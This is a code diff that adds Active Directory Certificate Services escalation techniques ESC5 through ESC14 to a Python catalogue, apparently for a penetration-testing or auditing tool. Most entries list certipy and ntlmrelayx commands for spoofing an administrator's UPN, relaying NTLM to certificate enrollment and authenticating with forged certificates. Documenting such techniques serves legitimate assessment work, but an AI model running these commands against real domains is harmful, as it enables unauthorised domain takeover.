@@ -97,6 +97,77 @@ ESC_TECHNIQUES: dict[str, EscTechnique] = {
         summary="Schema v2 template with arbitrary application policy OID.",
         manual_commands=("certipy req ... -application-policies 1.3.6.1.5.5.7.3.2",),
     ),
+    "esc5": EscTechnique(
+        key="esc5",
+        title="ESC5 — Vulnerable PKI object ACL",
+        severity="high",
+        mitre_id="T1649",
+        summary="Write access on AD CS container objects (NTAuthCertificates, PKI containers) enables CA/template manipulation.",
+        manual_commands=(
+            "certipy find -vulnerable -dc-ip <DC>",
+            "# Modify NTAuthCertificates or PKI enrollment containers",
+        ),
+    ),
+    "esc9": EscTechnique(
+        key="esc9",
+        title="ESC9 — No security extension (CT_FLAG_NO_SECURITY_EXTENSION)",
+        severity="high",
+        mitre_id="T1649",
+        summary="Template omits szOID_NTDS_CA_SECURITY_EXT — with weak mapping (StrongCertificateBindingEnforcement=0), GenericWrite enables UPN spoofing.",
+        manual_commands=(
+            "certipy shadow auto -u user@corp.local -p pass -account <target>",
+            "certipy req -u <target>@corp.local -hashes :<hash> -ca <CA> "
+            "-template <Template> -upn administrator@corp.local",
+            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
+        ),
+    ),
+    "esc10": EscTechnique(
+        key="esc10",
+        title="ESC10 — Weak certificate mapping",
+        severity="high",
+        mitre_id="T1649",
+        summary="Registry CertificateMappingMethods allows UPN-only mapping — UPN change + cert enrollment = impersonation.",
+        manual_commands=(
+            "# Change target's UPN to administrator@corp.local",
+            "certipy req -u <target>@corp.local -hashes :<hash> -ca <CA> -template <Template>",
+            "# Restore UPN, then auth with cert",
+            "certipy auth -pfx administrator.pfx -dc-ip <DC>",
+        ),
+    ),
+    "esc11": EscTechnique(
+        key="esc11",
+        title="ESC11 — NTLM relay to RPC enrollment (MS-ICPR)",
+        severity="high",
+        mitre_id="T1649",
+        summary="AD CS RPC interface (MS-ICPR) without IF_ENFORCEENCRYPTICERTREQUEST — relay NTLM to enroll certificates.",
+        manual_commands=(
+            "ntlmrelayx.py -t 'rpc://<CA>' --adcs --template <Template>",
+            "coerce authentication to relay listener",
+        ),
+    ),
+    "esc13": EscTechnique(
+        key="esc13",
+        title="ESC13 — Issuance policy OID group link",
+        severity="high",
+        mitre_id="T1649",
+        summary="Certificate template with issuance policy OID linked to a group via msDS-OIDToGroupLink — enrollment grants effective group membership.",
+        manual_commands=(
+            "certipy req -u user@corp.local -p pass -ca <CA> -template <Template>",
+            "certipy auth -pfx <user>.pfx -dc-ip <DC>",
+        ),
+    ),
+    "esc14": EscTechnique(
+        key="esc14",
+        title="ESC14 — Weak explicit certificate mapping",
+        severity="medium",
+        mitre_id="T1649",
+        summary="Explicit altSecurityIdentities mapping on user objects — writable entries enable cert-based impersonation.",
+        manual_commands=(
+            "# Modify altSecurityIdentities on target to map attacker's cert",
+            "certipy req -u user@corp.local -p pass -ca <CA> -template <Template>",
+            "certipy auth -pfx <user>.pfx -dc-ip <DC>",
+        ),
+    ),
     "golden_cert": EscTechnique(
         key="golden_cert",
         title="Golden Certificate",
